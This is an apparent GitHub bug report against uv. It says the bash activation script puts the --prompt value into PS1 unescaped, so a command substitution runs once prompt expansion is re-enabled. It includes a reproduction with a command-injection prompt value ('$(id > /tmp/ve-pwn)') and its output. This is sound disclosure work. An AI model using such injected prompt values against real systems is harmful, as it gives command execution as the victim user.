body:
### Summary

[CVE-2026-115586](https://www.cve.org/CVERecord?id=CVE-2026-115586) was recently disclosed for `virtualenv`, corresponding to https://github.com/pypa/virtualenv/security/advisories/GHSA-cx6f-vjhg-g3cc.

> The bash activator puts the caller-supplied prompt value into `PS1` unescaped whenever `promptvars` is off at activation time, and assumes prompt expansion can never run afterwards. `promptvars` and posix mode are runtime shell state, not a property of the activation moment: re-enabling prompt expansion in the same shell (`shopt -s promptvars`, `set -o posix`) or starting an interactive child bash that inherits the exported `PS1` makes bash expand the stored value and run the command substitution in it. An attacker who controls the prompt value gets command execution as the user who sources `bin/activate`.

Since `uv` uses activation scripts derived from `virtualenv`, I tried the proof of concept from https://github.com/pypa/virtualenv/security/advisories/GHSA-cx6f-vjhg-g3cc and was able to reproduce it, indicating that `uv` is affected by the same issue:

```
$ uv venv --prompt 'x$(id > /tmp/ve-pwn)y' /tmp/venv-demo
$ cat > /tmp/rc <<'EOF'                       
shopt -u promptvars
. /tmp/venv-demo/bin/activate
shopt -s promptvars
EOF
$ printf 'exit\n' | script -qec 'bash --noprofile --rcfile /tmp/rc -i' /dev/null
$ cat /tmp/ve-pwn
uid=1000(user) gid=1000(user) groups=1000(user) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

It’s my understanding from previous issues like https://github.com/astral-sh/uv/issues/23059 and https://github.com/astral-sh/uv/issues/23058 that that this would not be considered a vulnerability under `uv`’s attacker and threat models, because `uv` does not expect a hostile user to control the environment or parameters with which a virtual environment is created. I am therefore reporting this as a regular public bug.

### Platform

Fedora 45 x86_64

### Version

uv 0.13.7

### Python version

Python 3.15.2
title: Bash activator leaves the --prompt value unescaped in PS1 when promptvars is off, so prompt expansion later executes it
